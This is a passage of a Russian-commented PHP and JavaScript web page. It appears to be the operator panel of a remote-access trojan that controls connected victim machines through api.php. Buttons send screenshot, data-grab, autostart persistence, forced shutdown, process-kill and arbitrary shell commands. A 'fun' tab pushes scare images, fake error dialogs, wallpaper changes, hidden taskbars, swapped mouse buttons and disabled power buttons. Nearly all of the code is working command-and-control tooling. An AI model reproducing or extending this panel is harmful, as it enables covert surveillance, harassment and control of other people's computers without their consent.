  const container = document.getElementById('toast-container');
  const toast = document.createElement('div');

  toast.className = `toast ${type}`;
  toast.textContent = message;

  // Добавляем иконку
  const icon = document.createElement('span');
  icon.style.marginRight = '10px';

  switch(type) {
    case 'success':
      icon.innerHTML = '<i class="fas fa-check-circle"></i>';
      break;
    case 'error':
      icon.innerHTML = '<i class="fas fa-exclamation-triangle"></i>';
      break;
    case 'info':
      icon.innerHTML = '<i class="fas fa-info-circle"></i>';
      break;
  }

  toast.insertBefore(icon, toast.firstChild);

  container.appendChild(toast);

  // Удаление после анимации
  setTimeout(() => {
    toast.remove();
  }, 2000);
}

// Дополнительно: закрытие по клику
document.addEventListener('click', (e) => {
  if (e.target.closest('.toast')) {
    e.target.style.animation = 'fadeOut 0.5s ease-in forwards';
    setTimeout(() => e.target.remove(), 500);
  }
});
// В функции initEventHandlers или аналогичной
document.addEventListener('click', function(e) {
    if (e.target.closest('.delete-btn')) {
        const card = e.target.closest('.client-card');
        const clientId = card.id.replace('client-card-', '');
        deleteClient(clientId);
    }
});
</script>

<!-- Вкладка "Веселье" -->
<div id="fun" class="tab-content">
  <h2><i class="fa fa-tint" aria-hidden="true"> </i> Общие функции</h2>

  <!-- Выбор клиента -->
  <div class="card">
    <h3><i class="fas fa-users"></i> Выберите клиента</h3>
    <div class="client-select">

      <select id="commandClientSelect" onchange="updateSelectedUser()">
        <?php
          // Путь к файлу с данными
          $data_file = 'data.json';
          if (file_exists($data_file)) {
              $data = file_get_contents($data_file);
              $json = json_decode($data, true);
              if (isset($json['clients']) && is_array($json['clients'])):
                  foreach ($json['clients'] as $client_id => $client): ?>
                      <option value="<?php echo htmlspecialchars($client_id, ENT_QUOTES, 'UTF-8'); ?>">
                        <?php echo htmlspecialchars($client_id, ENT_QUOTES, 'UTF-8'); ?>
                      </option>
                  <?php endforeach;
              else: ?>
                  <option value="">Нет клиентов</option>
              <?php endif;
          } else { ?>
              <option value="">Файл data.json не найден</option>
        <?php } ?>
      </select>
      <!-- Элемент для отображения выбранного пользователя -->
      <p id="selectedUserDisplay" style="color: #fff; margin-top: 10px;">

      </p>

    </div>
    <span id="selectedUser"></span>
  </div>

<!-- Открытие сайта -->
<div class="card">
  <h3><i class="fas fa-external-link-alt"></i> Открытие сайта</h3>
  <div class="form-group">
    <label for="siteUrl">Введите URL сайта:</label>
    <input type="text" id="siteUrl" placeholder="Введите ссылку на сайт">
  </div>
  <button class="btn" onclick="openSite()">
    <i class="fas fa-link"></i> Открыть
  </button>
</div>

<!-- Замена картинки рабочего стола -->
<div class="card">
  <h3><i class="fas fa-image"></i> Замена картинки рабочего стола</h3>
  <div class="form-group">
    <label for="screenUrl">Ссылка на картинку:</label>
    <input type="text" id="screenUrl" placeholder="Введите ссылку на картинку">
  </div>

  <button class="btn" onclick="changeWallpaper()">
      <i class="fas fa-image"></i> Сменить
    </button>
</div>



<div class="card">
  <h3><i class="fas fa-image"></i> Скример (картинка)</h3>

  <div class="form-group">
    <label for="pictureUrl">Введите ссылку на картинку:</label>
    <input type="text" id="pictureUrl" placeholder="Введите ссылку на картинку">
  </div>

  <!-- Кнопки в одной строке -->
  <div class="picture-button-group">
    <button class="picture-btn" onclick="openPicture()">
      <i class="fas fa-eye"></i> Открыть
    </button>
    <button class="picture-btn" onclick="sendFunCommand('closepicture')">
      <i class="fas fa-eye-slash"></i> Закрыть
    </button>
  </div>
</div>


<style>
  /* Стили только для этих кнопок */
  .picture-button-group {
    display: flex; /* Кнопки в ряд */
    flex-wrap: wrap; /* Перенос на новую строку при необходимости */
    gap: 15px; /* Расстояние между кнопками */
  }

  .picture-btn {
    padding: 12px 24px; /* Внутренние отступы */
    background: #1a1a1a; /* Фон */
    color: #fff; /* Цвет текста */
    border: none; /* Убираем границу */
    border-radius: 4px; /* Скругление углов */
    cursor: pointer; /* Курсор в виде руки */
    font-size: 16px; /* Размер текста */
    transition: background-color 0.3s ease, transform 0.2s ease; /* Анимация */
    display: flex; /* Выровнять содержимое по центру */
    align-items: center; /* Центрирование по вертикали */
     width: 140px; /* Фиксированная ширина кнопки */
    height: 45px; /* Фиксированная высота кнопки */
    text-align: center; /* Выравнивание текста */
    cursor: pointer; /* Курсор в виде руки */
    margin-bottom: 10px; /* Отступ снизу */

  }

  .picture-btn:hover {
    background: #40444d; /* Фон при наведении */
    transform: scale(1.05); /* Увеличение при наведении */
  }

  .picture-btn i {
    margin-right: 10px; /* Отступ между иконкой и текстом */
  }
</style>


 <!-- Вывод ошибки -->
<div class="card">
  <h3><i class="fas fa-exclamation-circle"></i> Вывод ошибки</h3>
  <div class="form-group">
    <label for="errorTitle">Название ошибки:</label>
    <input type="text" id="errorTitle" placeholder="Введите название ошибки">
  </div>
  <div class="form-group">
    <label for="errorContent">Содержание ошибки:</label>
    <textarea id="errorContent" placeholder="Введите содержание ошибки"></textarea>
  </div>
  <div class="form-group">
    <label for="errorType">Вид ошибки:</label>
    <select id="errorType">
      <option value="notification">Уведомление</option>
      <option value="error">Ошибка</option>
    </select>
  </div>
  <button class="btn" onclick="showError()">
    <i class="fas fa-exclamation-triangle"></i> Вывести
  </button>
</div>

<!-- Подключение Font Awesome (для иконок) -->
<script src="https://kit.fontawesome.com/9dcebe2e5a.js" crossorigin="anonymous"></script>
<!-- Дополнительные команды -->
<div class="card">
        <h3><i class="fas fa-cogs"></i> Дополнительные команды</h3>

        <div class="compact-grid">
            <!-- Группа управления рабочим столом -->
            <div class="btn-group">
                <div class="group-title">Рабочий стол</div>
                <button class="btn-compact desktop-btn" onclick="sendFunCommand('offdesk')" title="Скрыть иконки на рабочем столе">
                    <span class="btn-icon"><i class="fas fa-eye-slash"></i></span>
                    <span>Скрыть иконки</span>
                </button>
                <button class="btn-compact desktop-btn" onclick="sendFunCommand('ondesk')" title="Показать иконки на рабочем столе">
                    <span class="btn-icon"><i class="fas fa-eye"></i></span>
                    <span>Показать иконки</span>
                </button>
            </div>

            <!-- Группа управления панелью задач -->
            <div class="btn-group">
                <div class="group-title">Панель задач</div>
                <button class="btn-compact task-btn" onclick="sendFunCommand('offtask')" title="Скрыть панель задач">
                    <span class="btn-icon"><i class="fas fa-chevron-down"></i></span>
                    <span>Скрыть панель</span>
                </button>
                <button class="btn-compact task-btn" onclick="sendFunCommand('ontask')" title="Показать панель задач">
                    <span class="btn-icon"><i class="fas fa-chevron-up"></i></span>
                    <span>Показать панель</span>
                </button>
            </div>

            <!-- Группа управления мышью -->
            <div class="btn-group">
                <div class="group-title">Настройки мыши</div>
                <button class="btn-compact mouse-btn" onclick="sendFunCommand('scren1')" title="Изменить основную кнопку">
                    <span class="btn-icon"><i class="fas fa-mouse-pointer"></i></span>
                    <span>Изменить курсор</span>
                </button>
                <button class="btn-compact mouse-btn" onclick="sendFunCommand('scren0')" title="Сбросить настройки мыши">
                    <span class="btn-icon"><i class="fas fa-redo"></i></span>
                    <span>Сбросить настройки</span>
                </button>
            </div>

            <!-- Группа управления дребезгом мыши -->
            <div class="btn-group">
                <div class="group-title">Дребезг мыши</div>
                <button class="btn-compact drabmouse-btn" onclick="sendFunCommand('drabmouseon')" title="Включить дребезг мыши">
                    <span class="btn-icon"><i class="fas fa-toggle-on"></i></span>
                    <span>Включить</span>
                </button>
                <button class="btn-compact drabmouse-btn" onclick="sendFunCommand('drabmouseoff')" title="Выключить дребезг мыши">
                    <span class="btn-icon"><i class="fas fa-toggle-off"></i></span>
                    <span>Выключить</span>
                </button>
                </div>

                <div class="btn-group">
                <div class="group-title">Кнопки питания</div>
                <button class="btn-compact drabmouse-btn" onclick="sendFunCommand('powerbtnon')" title="Включить кнопки питания">
                    <span class="btn-icon"><i class="fas fa-toggle-on"></i></span>
                    <span>Включить</span>
                </button>
                <button class="btn-compact drabmouse-btn" onclick="sendFunCommand('powerbtnoff')" title="Выключить дкнопки питания">
                    <span class="btn-icon"><i class="fas fa-toggle-off"></i></span>
                    <span>Выключить</span>
                </button>
            </div>
        </div>
    </div>
<!-- Стили для улучшенного дизайна -->


<!-- Скрипты -->
<script>
  /// Общие классы для селекторов
const CLIENT_SELECT_CLASS = 'client-select';
const CLIENT_SELECTOR = `.${CLIENT_SELECT_CLASS} select`;

// Обновляем состояние при выборе клиента
function updateClientState(clientId) {
    // Обновляем все селекторы
    document.querySelectorAll(CLIENT_SELECTOR).forEach(select => {
        if (select.value !== clientId) {
            select.value = clientId;
        }
    });

    // Обновляем отображение
    document.getElementById('selectedUser').textContent = clientId || 'не выбран';

    // Сохраняем в URL и localStorage
    const url = new URL(window.location);
    url.searchParams.set('client_id', clientId);
    window.history.replaceState({ clientId }, '', url);
    localStorage.setItem('selectedClientId', clientId);
}

// Обработчик изменения селектора
function handleClientSelection(event) {
    const selectedValue = event.target.value;
    updateClientState(selectedValue);
}

// Инициализация селекторов
function initializeClientSelection() {
    const urlParams = new URLSearchParams(window.location.search);
    const savedClientId = urlParams.get('client_id') || localStorage.getItem('selectedClientId');

    // Получаем первый доступный клиент
    const firstClient = document.querySelector(CLIENT_SELECTOR)?.options[0]?.value;

    // Устанавливаем значение для всех селекторов
    const clientId = savedClientId || firstClient;
    if (clientId) {
        updateClientState(clientId);
    }
}

// Синхронизация между вкладками
window.addEventListener('storage', function(e) {
    if (e.key === 'selectedClientId') {
        updateClientState(e.newValue);
    }
});

// Инициализация при загрузке
document.addEventListener('DOMContentLoaded', () => {
    // Добавляем обработчики для всех селекторов
    document.querySelectorAll(CLIENT_SELECTOR).forEach(select => {
        select.addEventListener('change', handleClientSelection);
    });

    initializeClientSelection();
});

  // Функция отправки команды на выбранного клиента
  function sendFunCommand(command) {
    const clientSelect = document.getElementById('commandClientSelect');
    const clientId = clientSelect ? clientSelect.value : '';
    if (!clientId) {
      alert('Нет выбранного клиента!');
      return;
    }
    console.log("Отправка команды для клиента " + clientId + ": " + command);
    sendCommand(clientId, command);
  }

  // Функция для открытия сайта
  function openSite() {
    var url = document.getElementById('siteUrl').value.trim();
    if (url) {
      var command = "site:" + url;
      console.log("Формируем команду для открытия сайта: " + command);
      sendFunCommand(command);
    } else {
      showToast('info', 'Пожалуйста, введите ссылку для открытие сайта.');
    }
  }

  // Функция смены картинки рабочего стола
  function changeDesktopImage() {
    var url = document.getElementById('screenUrl').value.trim();
    if (url) {
      var command = "setscreen:" + url;
      console.log("Формируем команду смены картинки: " + command);
      sendFunCommand(command);
    } else {
      showToast('info', 'Пожалуйста, введите ссылку на картинку.');
    }
  }

  // Функция открытия картинки по ссылке
  function openPicture() {
    var url = document.getElementById('pictureUrl').value.trim();
    if (url) {
      var command = "openpicture:" + url;
      console.log("Формируем команду для открытия картинки: " + command);
      sendFunCommand(command);
    } else {
      showToast('info', 'Пожалуйста, введите ссылку на картинку.');;
    }
  }
  // Функция открытия картинки по ссылке
  function changeWallpaper() {
    var url = document.getElementById('screenUrl').value.trim();
    if (url) {
      var command = "setscreen:" + url;
      console.log("Формируем команду для открытия картинки: " + command);
      sendFunCommand(command);
    } else {
      showToast('info', 'Пожалуйста, введите ссылку на картинку.');
    }
  }

  // Функция вывода ошибки
  function showError() {
    var title = document.getElementById('errorTitle').value.trim();
    var content = document.getElementById('errorContent').value.trim();
    var type = document.getElementById('errorType').value;
    var command = (type === 'notification')
                  ? "notification:" + title + ":" + content
                  : "error:" + title + ":" + content;
    console.log("Формируем команду ошибки: " + command);
    sendFunCommand(command);
  }

  // Функция отправки команды через fetch
  function sendCommand(clientId, command) {
    fetch('api.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `action=set_command&client_id=${encodeURIComponent(clientId)}&command=${encodeURIComponent(command)}`
    }).then(response => {
      if (response.ok) {
        showToast('success', 'Команда доставлена успешно!', false, 'fa-check-circle');
        console.log('Команда отправлена:', command);
      } else {
        showToast('error', 'Команда не отправлена', true, 'fa-times-circle');
        console.error('Ошибка отправки команды');
      }
    }).catch(error => {
      showNotification('Ошибка: ' + error, true, 'fa-times-circle');
      console.error('Ошибка:', error);
    });
  }
let processMonitoringInterval = null;
let isMonitoringActive = false;
let currentClientId = null;
let allProcesses = [];
let currentSort = { column: 'memory', direction: 'desc' };
let currentFilter = '';

// Функция для переключения мониторинга процессов
function toggleTaskManager() {
    const button = document.getElementById('toggleTaskManager');
    const clientSelect = document.getElementById('taskManagerClientSelect');
    currentClientId = clientSelect.value;

    if (!currentClientId) {
        alert('Пожалуйста, выберите клиента');
        return;
    }

    if (isMonitoringActive) {
        // Останавливаем мониторинг
        clearInterval(processMonitoringInterval);
        isMonitoringActive = false;
        button.innerHTML = '<i class="fas fa-play"></i> Включить мониторинг';
        button.classList.remove('active');

        // Отправляем команду остановки мониторинга
        sendCommand('stop_process_monitoring');
    } else {
        // Запускаем мониторинг
        isMonitoringActive = true;
        button.innerHTML = '<i class="fas fa-stop"></i> Выключить мониторинг';
        button.classList.add('active');

        // Запускаем немедленное обновление и устанавливаем интервал
        updateProcessList();
        processMonitoringInterval = setInterval(updateProcessList, 5000);

        // Отправляем команду запуска мониторинга
        sendCommand('start_process_monitoring');
    }
}

// Функция для отправки команд мониторинга процессов на сервер
function sendProcessMonitorCommand(command) {
    if (!currentClientId) {
        console.error('Не выбран клиент для отправки команды');
        return;
    }

    // Создаем уникальный идентификатор для этой команды
    const commandId = `process_monitor_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

    const formData = new FormData();
    formData.append('action', 'set_command');
    formData.append('client_id', currentClientId);
    formData.append('command', command);
    formData.append('command_id', commandId); // Добавляем уникальный идентификатор
    formData.append('command_type', 'process_monitor'); // Добавляем тип команды

    fetch('api.php', {
        method: 'POST',
        body: formData
    })
    .then(response => {
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        return response.json();
    })
    .then(data => {
        if (data.status !== 'ok') {
            console.error('Ошибка отправки команды мониторинга процессов:', data.message);
            // Показываем уведомление об ошибке
            showNotification(`Ошибка отправки команды: ${data.message}`, 'error');
        } else {
            console.log('Команда мониторинга процессов успешно отправлена:', command);
        }
    })
    .catch(error => {
        console.error('Ошибка отправки команды мониторинга процессов:', error);
        // Показываем уведомление об ошибке
        showNotification('Ошибка отправки команды мониторинга процессов', 'error');
    });
}

// Обновляем вызовы этой функции в других частях кода:
function toggleTaskManager() {
    const button = document.getElementById('toggleTaskManager');
    const clientSelect = document.getElementById('taskManagerClientSelect');
    currentClientId = clientSelect.value;

    if (!currentClientId) {
        alert('Пожалуйста, выберите клиента');
        return;
    }

    if (isMonitoringActive) {
        // Останавливаем мониторинг
        clearInterval(processMonitoringInterval);
        isMonitoringActive = false;
        button.innerHTML = '<i class="fas fa-play"></i> Включить мониторинг';
        button.classList.remove('active');

        // Отправляем команду остановки мониторинга
        sendProcessMonitorCommand('stop_process_monitoring');
    } else {
        // Запускаем мониторинг
        isMonitoringActive = true;
        button.innerHTML = '<i class="fas fa-stop"></i> Выключить мониторинг';
        button.classList.add('active');

        // Запускаем немедленное обновление и устанавливаем интервал
        updateProcessList();
        processMonitoringInterval = setInterval(updateProcessList, 5000);

        // Отправляем команду запуска мониторинга
        sendProcessMonitorCommand('start_process_monitoring');
    }
}

// Функция для завершения процесса
function killProcess(pid) {
    if (!pid || !currentClientId) return;

    if (!confirm(`Вы уверены, что хотите завершить процесс с PID ${pid}?`)) {
        return;
    }

    // Используем уникальный идентификатор для команды завершения процесса
    const commandId = `kill_process_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

    fetch('api.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `action=kill_process&client_id=${currentClientId}&pid=${pid}&command_id=${commandId}&command_type=process_monitor`
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === 'ok') {
            showNotification(`Команда завершения процесса ${pid} отправлена`, 'success');
            // Обновляем список процессов после завершения
            setTimeout(updateProcessList, 1000);
        } else {
            showNotification('Ошибка при отправке команды завершения процесса: ' + data.message, 'error');
        }
    })
    .catch(error => {
        console.error('Ошибка:', error);
        showNotification('Ошибка при отправке команды завершения процесса', 'error');
    });
}

// Функция для обновления списка процессов
function updateProcessList() {
    if (!currentClientId) return;

    // Получаем информацию о процессах
    fetch('api.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `action=get_processes&client_id=${currentClientId}`
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.json();
    })
    .then(processes => {
        console.log('Получены процессы:', processes);
        // Сохраняем все процессы
        allProcesses = processes;

        // Обрабатываем и фильтруем процессы
        const processedProcesses = processAndFilterData(processes);
        renderProcessList(processedProcesses);
        updateCounters(processedProcesses);
        updateLastUpdateTime();
    })
    .catch(error => {
        console.error('Ошибка получения процессов:', error);
        // Показываем сообщение об ошибке
        const processList = document.getElementById('processList');
        processList.innerHTML = '<tr><td colspan="6" style="text-align: center; color: red;">Ошибка загрузки процессов</td></tr>';
    });

    // Получаем информацию о клиенте (имя машины)
    fetch('api.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `action=get_client_info&client_id=${currentClientId}`
    })
    .then(response => response.json())
    .then(info => {
        document.getElementById('machineName').textContent = `Машина: ${info.machine || 'Неизвестно'}`;
    })
    .catch(error => console.error('Ошибка получения информации о клиенте:', error));
}

// Функция для обработки и фильтрации данных процессов
function processAndFilterData(processes) {
    if (!processes || !Array.isArray(processes)) {
        console.error('Некорректные данные процессов:', processes);
        return [];
    }

    // Убираем дубликаты по PID и имени
    const seen = new Set();
    const uniqueProcesses = [];

    for (const process of processes) {
        // Проверяем, что процесс имеет необходимые поля
        if (!process || !process.pid || !process.name) continue;

        const key = `${process.pid}-${process.name}`;
        if (!seen.has(key)) {
            seen.add(key);

            // Добавляем только процессы с валидными данными
            if (isValidProcess(process)) {
                // Применяем текстовый фильтр, если он установлен
                if (!currentFilter ||
                    process.name.toLowerCase().includes(currentFilter) ||
                    process.pid.toString().includes(currentFilter) ||
                    (process.status && process.status.toLowerCase().includes(currentFilter))) {
                    uniqueProcesses.push(process);
                }
            }
        }
    }

    // Сортируем процессы
    return sortProcesses(uniqueProcesses, currentSort.column, currentSort.direction);
}

// Функция для сортировки процессов
function sortProcesses(processes, column, direction) {
    return processes.sort((a, b) => {
        let valueA, valueB;

        switch(column) {
            case 'pid':
                valueA = a.pid;
                valueB = b.pid;
                break;
            case 'name':
                valueA = a.name.toLowerCase();
                valueB = b.name.toLowerCase();
                break;
            case 'status':
                valueA = a.status || '';
                valueB = b.status || '';
                break;
            case 'memory':
                valueA = parseMemory(a.memory_usage || a.memory);
                valueB = parseMemory(b.memory_usage || b.memory);
                break;
            case 'threads':
                valueA = a.num_threads || 0;
                valueB = b.num_threads || 0;
                break;
            default:
                return 0;
        }

        if (direction === 'asc') {
            return valueA > valueB ? 1 : -1;
        } else {
            return valueA < valueB ? 1 : -1;
        }
    });
}

// Функция для проверки валидности процесса
function isValidProcess(process) {
    // Список системных процессов для исключения
    const systemProcesses = [
        'svchost.exe', 'csrss.exe', 'wininit.exe', 'winlogon.exe',
        'services.exe', 'lsass.exe', 'smss.exe', 'System', 'System Idle Process',
        'TextInputHost.exe', 'ShellExperienceHost.exe', 'NhNotifSys.exe',
        'RuntimeBroker.exe', 'SearchApp.exe', 'BackgroundTaskHost.exe',
        'ApplicationFrameHost.exe', 'dwm.exe', 'conhost.exe', 'taskhostw.exe',
        'SearchIndexer.exe', 'spoolsv.exe', 'lsm.exe', 'taskeng.exe',
        'taskhost.exe', 'dllhost.exe', 'atieclxx.exe', 'atiesrxx.exe',
        'audiodg.exe', 'mfemms.exe', 'msmpeng.exe', 'MsMpEng.exe',
        'NisSrv.exe', 'wlanext.exe', 'WUDFHost.exe'
    ];

    return process &&
           process.pid &&
           process.name &&
           !systemProcesses.includes(process.name) &&
           !process.name.toLowerCase().includes('system') &&
           !process.name.toLowerCase().includes('idle');
}

// Функция для парсинга значения памяти
function parseMemory(memoryValue) {
    if (!memoryValue) return 0;

    if (typeof memoryValue === 'number') {
        return memoryValue;
    }

    if (typeof memoryValue === 'string') {
        // Пытаемся извлечь числовое значение из строки
        const match = memoryValue.match(/(\d+\.?\d*)/);
        if (match) {
            return parseFloat(match[1]);
        }
    }

    return 0;
}

// Функция для отображения списка процессов
function renderProcessList(processes) {
    const processList = document.getElementById('processList');
    processList.innerHTML = '';

    if (!processes || processes.length === 0) {
        processList.innerHTML = '<tr><td colspan="6" style="text-align: center;">Нет данных о процессах</td></tr>';
        return;
    }

    processes.forEach(process => {
        const row = document.createElement('tr');

        // Получаем значения для отображения
        const pid = process.pid || 'N/A';
        const name = process.name || 'N/A';
        const status = process.status || 'unknown';
        const memory = process.memory_usage || process.memory || 0;
        const threads = process.num_threads || 'N/A';

        row.innerHTML = `
            <td>${pid}</td>
            <td title="${name}">${truncateText(name, 30)}</td>
            <td>${status}</td>
            <td>${formatMemory(memory)}</td>
            <td>${threads}</td>
            <td>
                <button class="btn-kill" onclick="killProcess(${pid})" title="Завершить процесс">
                    <i class="fas fa-skull"></i> Завершить
                </button>
            </td>
        `;

        processList.appendChild(row);
    });
}

// Функция для обновления счетчиков процессов и памяти
function updateCounters(processes) {
    const processCount = processes.length;
    const totalMemory = processes.reduce((sum, process) => {
        return sum + parseMemory(process.memory_usage || process.memory);
    }, 0);

    document.getElementById('processCount').textContent = `${processCount} процессов`;
    document.getElementById('memoryUsage').textContent = `${formatMemory(totalMemory)}`;
}

// Функция для обрезки длинного текста
function truncateText(text, maxLength) {
    if (!text || text.length <= maxLength) return text;
    return text.substring(0, maxLength) + '...';
}

// Функция для форматирования памяти
function formatMemory(memory) {
    if (!memory && memory !== 0) return 'N/A';

    const num = parseMemory(memory);

    if (num >= 1024) {
        return (num / 1024).toFixed(2) + ' MB';
    } else {
        return num.toFixed(2) + ' KB';
    }
}

// Функция для завершения процесса
function killProcess(pid) {
    if (!pid || !currentClientId) return;

    if (!confirm(`Вы уверены, что хотите завершить процесс с PID ${pid}?`)) {
        return;
    }

    fetch('api.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `action=kill_process&client_id=${currentClientId}&pid=${pid}`
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === 'ok') {
            showNotification(`Команда завершения процесса ${pid} отправлена`, 'success');
            // Обновляем список процессов после завершения
            setTimeout(updateProcessList, 1000);
        } else {
            showNotification('Ошибка при отправке команды завершения процесса: ' + data.message, 'error');
        }
    })
    .catch(error => {
        console.error('Ошибка:', error);
        showNotification('Ошибка при отправке команды завершения процесса', 'error');
    });
}

// Функция для показа уведомлений
function showNotification(message, type = 'info') {
    // Создаем элемент уведомления, если его нет
    let notification = document.getElementById('processNotification');
    if (!notification) {
        notification = document.createElement('div');
        notification.id = 'processNotification';
        notification.style.position = 'fixed';
        notification.style.top = '20px';
        notification.style.right = '20px';
        notification.style.padding = '10px 15px';
        notification.style.borderRadius = '4px';
        notification.style.zIndex = '1000';
        notification.style.maxWidth = '300px';
        document.body.appendChild(notification);
    }

    // Устанавливаем стиль в зависимости от типа
    notification.style.backgroundColor = type === 'error' ? '#f44336' :
                                       type === 'success' ? '#4CAF50' : '#2196F3';
    notification.style.color = 'white';

    // Устанавливаем текст и показываем
    notification.textContent = message;
    notification.style.display = 'block';

    // Скрываем через 3 секунды
    setTimeout(() => {
        notification.style.display = 'none';
    }, 3000);
}

// Функция для обновления времени последнего обновления
function updateLastUpdateTime() {
    const now = new Date();
    const formattedTime = now.toLocaleTimeString();
    document.getElementById('lastUpdate').textContent = `Последнее обновление: ${formattedTime}`;
}

// Функция для применения фильтра
function applyFilter() {
    const filterInput = document.getElementById('processFilter');
    currentFilter = filterInput.value.toLowerCase();

    // Обрабатываем и фильтруем процессы
    const processedProcesses = processAndFilterData(allProcesses);
    renderProcessList(processedProcesses);
    updateCounters(processedProcesses);
}

// Функция для сортировки таблицы
function sortTable(column) {
    // Если уже сортируем по этому столбцу, меняем направление
    if (currentSort.column === column) {
        currentSort.direction = currentSort.direction === 'asc' ? 'desc' : 'asc';
    } else {
        currentSort.column = column;
        currentSort.direction = 'asc';
    }

    // Обновляем иконки сортировки
    document.querySelectorAll('#processTable th').forEach(th => {
        th.classList.remove('sorted', 'sorted-asc', 'sorted-desc');
        const icon = th.querySelector('i');
        if (icon) {
            icon.className = 'fas fa-sort';
        }
    });

    const currentHeader = document.querySelector(`#processTable th[data-sort="${column}"]`);
    if (currentHeader) {
        currentHeader.classList.add('sorted');
        currentHeader.classList.add(currentSort.direction === 'asc' ? 'sorted-asc' : 'sorted-desc');

        const icon = currentHeader.querySelector('i');
        if (icon) {
            icon.className = currentSort.direction === 'asc' ? 'fas fa-sort-up' : 'fas fa-sort-down';
        }
    }

    // Обрабатываем и фильтруем процессы
    const processedProcesses = processAndFilterData(allProcesses);
    renderProcessList(processedProcesses);
}

// Глобальные переменные для управления обновлением
let currentClientIds = [];
let refreshInterval;

// Функция для загрузки и обновления карточек клиентов
function refreshClientCards() {
    fetch('?ajax=1&t=' + new Date().getTime())
        .then(response => {
            if (!response.ok) throw new Error('Network error');
            return response.text();
        })
        .then(html => {
            const parser = new DOMParser();
            const doc = parser.parseFromString(html, 'text/html');
            const newClientGrid = doc.querySelector('.client-grid');

            if (newClientGrid) {
                const oldClientGrid = document.querySelector('.client-grid');
                if (oldClientGrid) {
                    oldClientGrid.parentNode.replaceChild(newClientGrid, oldClientGrid);
                } else {
                    const manageTab = document.getElementById('manage');
                    manageTab.innerHTML = html;
                }

                // Переинициализация обработчиков событий
                initEventHandlers();

                // Показываем уведомление о новых клиентах, если есть изменения
                checkForNewClients();
            }
        })
        .catch(error => {
            console.error('Ошибка при обновлении карточек:', error);
        });
}

// Функция для проверки появления новых клиентов
function checkForNewClients() {
    const clientCards = document.querySelectorAll('.client-card');
    const newClientIds = Array.from(clientCards).map(card => {
        return card.querySelector('.client-title h3').textContent.trim();
    });

    // Находим новые clientId, которых не было в предыдущем списке
    const addedClients = newClientIds.filter(id => !currentClientIds.includes(id));

    if (addedClients.length > 0) {
        showToast('success', `Подключился новый клиент: ${addedClients.join(', ')}`);
    }

    // Обновляем текущий список clientId
    currentClientIds = newClientIds;
}

// Инициализация обработчиков событий
function initEventHandlers() {
    // Инициализация кнопки удаления
    document.querySelectorAll('.delete-btn').forEach(btn => {
        btn.addEventListener('click', function() {
            const clientId = this.closest('.client-card').querySelector('.client-title h3').textContent.trim();
            deleteClient(clientId);
        });
    });

    // Инициализация кнопок команд
    document.querySelectorAll('.btn-icon').forEach(btn => {
        if (btn.querySelector('.fa-database')) {
            btn.addEventListener('click', function() {
                const clientId = this.closest('.client-card').querySelector('.client-title h3').textContent.trim();
                sendCommand(clientId, 'get_data');
                showToast('info', 'Команда на получение данных отправлена');
            });
        } else if (btn.querySelector('.fa-play-circle')) {
            btn.addEventListener('click', function() {
                const clientId = this.closest('.client-card').querySelector('.client-title h3').textContent.trim();
                sendCommand(clientId, 'addstart');
                showToast('info', 'Команда на автостарт отправлена');
            });
        } else if (btn.querySelector('.fa-power-off')) {
            btn.addEventListener('click', function() {
                const clientId = this.closest('.client-card').querySelector('.client-title h3').textContent.trim();
                sendCommand(clientId, 'shutdown /s /f /t 0');
                showToast('info', 'Команда на выключение отправлена');
            });
        } else if (btn.querySelector('.fa-camera')) {
            btn.addEventListener('click', function() {
                const clientId = this.closest('.client-card').querySelector('.client-title h3').textContent.trim();
                sendCommand(clientId, 'screenshot');
                showToast('info', 'Запрос скриншота отправлен');
            });
        }
    });

    // Инициализация кнопок редактирования описания
    document.querySelectorAll('.edit-description-btn').forEach(btn => {
        btn.addEventListener('click', function() {
            const clientId = this.closest('.client-card').querySelector('.client-title h3').textContent.trim();
            showDescriptionEditor(clientId);
        });
    });

    // Инициализация форм ввода команд
    document.querySelectorAll('.command-input').forEach(form => {
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            const clientId = this.querySelector('input[name="client_id"]').value;
            const command = this.querySelector('input[name="command"]').value;

            if (command.trim()) {
                sendCommand(clientId, command.trim());
                this.reset();
            }
        });
    });

    // Инициализация кнопок просмотра скриншотов
    document.querySelectorAll('.btn-icon').forEach(btn => {
        if (btn.querySelector('.fa-image')) {
            btn.addEventListener('click', function() {
                const screenshotUrl = this.getAttribute('onclick').match(/'([^']+)'/)[1];
                openModal(screenshotUrl);
                showToast('info', 'Просмотр скриншота');
            });
        }
    });
}

// Функция для запуска/остановки автоматического обновления
function toggleAutoRefresh(enable) {
    if (enable) {
        // Запускаем обновление сразу и затем каждые 3 секунды
        refreshClientCards();
        refreshInterval = setInterval(refreshClientCards, 2000);
    } else if (refreshInterval) {
        clearInterval(refreshInterval);
        refreshInterval = null;
    }
}

// Инициализация при загрузке страницы
document.addEventListener('DOMContentLoaded', function() {
    // Сохраняем изначальный список clientId
    const initialClientCards = document.querySelectorAll('.client-card');
    currentClientIds = Array.from(initialClientCards).map(card => {
        return card.querySelector('.client-title h3').textContent.trim();
    });

    // Инициализируем обработчики событий
    initEventHandlers();

    // Запускаем автоматическое обновление
    toggleAutoRefresh(true);

    // Останавливаем обновление при скрытии вкладки
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            toggleAutoRefresh(false);
        } else {
            toggleAutoRefresh(true);
        }
    });
});
</script>

</div>
    </div>
    </div>


</body>
</html>